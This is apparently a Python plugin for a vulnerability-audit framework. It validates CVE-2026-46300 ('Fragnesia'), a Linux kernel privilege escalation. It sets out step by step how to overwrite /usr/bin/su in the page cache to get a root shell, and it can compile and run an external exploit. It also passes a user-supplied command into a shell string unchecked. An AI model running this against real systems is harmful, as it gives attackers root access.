#!/usr/bin/env python3
"""CVE-2026-46300 – Fragnesia: splice() injects read-only page cache into TCP skb; ESP-in-TCP (espintcp ULP) AES-GCM in-place decryption writes byte-controllable values into page cache → root via setuid binary page cache poisoning.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46300%20Fragnesia
  Files: ['exploit/exp.c']
  Discovered by: William Bowling / V12 team
  Technique:
    1. unshare(CLONE_NEWUSER|CLONE_NEWNET) to get CAP_NET_ADMIN in net namespace.
    2. Register XFRM ESP-in-TCP state (rfc4106(gcm(aes))) loopback ::1.
    3. Build AF_ALG ecb(aes) stream0 table: for each target byte, precompute IV/nonce
       such that AES-GCM stream0 keystream byte = current_byte XOR desired_byte.
    4. For each of 192 target bytes: send ESP-in-TCP prefix + splice(target_file page)
       → delayed TCP_ULP espintcp enable → XFRM ESP-in-TCP in-place AES-GCM decrypt
       → precisely overwrites one page cache byte.
    5. After 192 iterations, /usr/bin/su page cache head is the 192-byte root-shell ELF.
    6. execve(/usr/bin/su) → uid=0 root shell.
  Exit codes: 0=fixed, 1=vulnerable, 2=env error, 4=namespace gate closed.

Reference: https://lists.openwall.net/netdev/2026/05/13/79
"""
from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 53,
    "cve": "CVE-2026-46300",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel (IVI/边缘 Linux 节点 with XFRM+TCP_ULP)",
    "component": "Linux kernel net/ – ESP-in-TCP (TCP_ULP espintcp) + XFRM + AES-GCM in-place decrypt",
    "type": "本地权限提升 (LPE) → root / 逐字节可控 Page Cache 替换",
    "summary": (
        "Fragnesia CVE-2026-46300: splice() 把只读文件页缓存引入 TCP 数据流，"
        "延迟启用 TCP_ULP espintcp 后 ESP-in-TCP XFRM 路径原地 AES-GCM 解密，"
        "攻击者通过 AF_ALG 预计算 keystream 表实现逐字节精确覆盖 page cache。"
        "最终 /usr/bin/su 的 page cache 开头 192 字节被替换为 root shell ELF → root。"
    ),
    "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46300%20Fragnesia",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [{"version": "any", "status": "affected", "lessThan": "patched"}],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/Unclecheng-li__poc-lab"
    / "CVE-2026-46300 Fragnesia/exploit"
)


def _check_prerequisites() -> dict:
    result: dict = {}
    try:
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        result["kernel_version"] = r.stdout.strip()

        # User namespace
        userns = Path("/proc/sys/user/max_user_namespaces")
        result["user_namespace_max"] = userns.read_text().strip() if userns.exists() else "unknown"
        result["user_namespace_enabled"] = result["user_namespace_max"] not in ("0", "unknown")

        # AppArmor userns restriction (Ubuntu)
        aa_userns = Path("/proc/sys/kernel/apparmor_restrict_unprivileged_userns")
        if aa_userns.exists():
            result["apparmor_restrict_userns"] = aa_userns.read_text().strip()

        # Check XFRM / esp* modules
        lsmod = subprocess.run("lsmod", capture_output=True, text=True, timeout=5)
        result["xfrm_loaded"] = "xfrm" in lsmod.stdout or "esp" in lsmod.stdout
        result["espintcp_available"] = any(
            x in lsmod.stdout for x in ["xfrm_interface", "esp4", "esp6", "espintcp"]
        )

        # Check AF_ALG crypto (ecb(aes)) needed for stream0 table
        af_alg_check = subprocess.run(
            "grep -i 'ecb.*aes\\|aes.*ecb' /proc/crypto 2>/dev/null | head -3",
            shell=True, capture_output=True, text=True, timeout=5,
        )
        result["afalg_ecb_aes_available"] = bool(af_alg_check.stdout.strip())

        # /usr/bin/su existence (target for page cache poisoning)
        su_paths = ["/usr/bin/su", "/bin/su"]
        su_found = next((p for p in su_paths if Path(p).exists()), None)
        result["su_target"] = su_found

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}
    exp_c = POC_REPO / "exp.c"

    if not exp_c.exists():
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/Unclecheng-li/poc-lab into "
            "public_poc_sources/repos/Unclecheng-li__poc-lab. "
            "Build: gcc -O2 -Wall -Wextra -static exp.c -o fragnesia_exp "
            "Run: ./fragnesia_exp (exit 1=vulnerable, 0=fixed, 4=namespace blocked)"
        )
        result["would_compile"] = "gcc -O2 -Wall -Wextra exp.c -o fragnesia_exp"
        result["would_run"] = "./fragnesia_exp"
        return result

    if not allow_disruptive:
        result["would_compile"] = "gcc -O2 -Wall -Wextra exp.c -o fragnesia_exp"
        result["would_run"] = "./fragnesia_exp"
        result["detail"] = (
            "Set allow_disruptive=true to compile and run Fragnesia PoC. "
            "WARNING: Replaces /usr/bin/su page cache with root-shell ELF. "
            "Isolated VM + snapshot strongly recommended."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        shutil.copy2(str(exp_c), f"{tmpdir}/exp.c")
        r = subprocess.run(
            "gcc -O2 -Wall -Wextra exp.c -o fragnesia_exp",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
        )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]
        if r.returncode != 0:
            # Try without -static
            r = subprocess.run(
                "gcc -O2 exp.c -o fragnesia_exp",
                shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
            )
            result["compile_rc"] = r.returncode
            result["compile_out"] += (r.stdout + r.stderr)[:200]
            if r.returncode != 0:
                result["detail"] = "Compile failed."
                return result

        r2 = subprocess.run(
            f"./fragnesia_exp; {lab_cmd}",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=240,
        )
        result["run_rc"] = r2.returncode
        result["run_out"] = (r2.stdout + r2.stderr)[:600]
        # Exit code 1 = vulnerable per PoC spec; 0 = fixed; 4 = namespace blocked
        result["exploited"] = r2.returncode == 1 or (
            "uid=0" in r2.stdout or "BUG:" in r2.stdout
        )
        result["namespace_blocked"] = r2.returncode == 4
        result["likely_fixed"] = r2.returncode == 0
    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_cmd = (plugin.params or {}).get("lab_command", "id")

    evidence: dict = {
        "cve": "CVE-2026-46300",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": (POC_REPO / "exp.c").exists(),
        "exploit_files": ["exploit/exp.c"],
        "technique": (
            "unshare NEWUSER+NEWNET → XFRM ESP-in-TCP SA (rfc4106 gcm(aes)) loopback ::1 "
            "→ AF_ALG ecb(aes) build 256-entry stream0 nonce table "
            "→ for each of 192 target bytes: send ESP-in-TCP prefix + splice(/usr/bin/su page) "
            "→ delayed TCP_ULP espintcp → AES-GCM in-place decrypt → single-byte page cache overwrite "
            "→ 192 iters = root-shell ELF in page cache → execve(/usr/bin/su) → uid=0."
        ),
        "exit_code_semantics": "1=vulnerable, 0=fixed, 2=env error, 4=namespace blocked",
        "reference": "https://lists.openwall.net/netdev/2026/05/13/79",
    }

    prereq = _check_prerequisites()
    evidence.update(prereq)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    vulnerable = evidence.get("exploited")
    if evidence.get("likely_fixed"):
        vulnerable = False
    if evidence.get("namespace_blocked"):
        evidence["note"] = "Namespace gate blocked – userns restriction in effect (mitigated)."

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46300%20Fragnesia",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc53CVE202646300FragnesiaESPTCPLpeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-053"
    meta_poc_name = 'CVE-2026-46300 Fragnesia ESP Privilege Escalation Active Validation'
    meta_cve_id = "CVE-2026-46300"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "pagecache", "xfrm", "espintcp"]
    meta_source_url = "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46300%20Fragnesia"
    meta_references       = ['https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46300%20Fragnesia']
    meta_attack_surface = (
        "本地用户通过 ESP-in-TCP ULP + AES-GCM 逐字节精确覆盖 setuid 二进制 page cache → root"
    )
    is_disruptive = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "53_Linux_Kernel_Fragnesia_ESP_TCP_LPE_Audit") if "VULN" in dir() else "53_Linux_Kernel_Fragnesia_ESP_TCP_LPE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc53CVE202646300FragnesiaESPTCPLpeAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
